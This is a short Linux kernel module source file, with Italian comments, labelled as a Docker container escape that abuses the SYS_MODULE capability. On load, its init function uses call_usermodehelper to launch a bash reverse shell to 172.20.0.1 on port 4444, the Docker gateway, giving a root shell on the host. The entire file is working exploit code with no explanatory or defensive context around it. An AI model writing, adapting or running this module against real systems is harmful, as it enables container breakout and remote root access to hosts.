#include <linux/kmod.h>
#include <linux/module.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Attack");
MODULE_DESCRIPTION("Docker Escape via SYS_MODULE");

/* IP del gateway Docker e porta 4444 */
char* argv[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/172.20.0.1/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

static int __init exploit_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit exploit_exit(void) {
    printk(KERN_INFO "Exploit rimosso.\n");
}

module_init(exploit_init);
module_exit(exploit_exit);
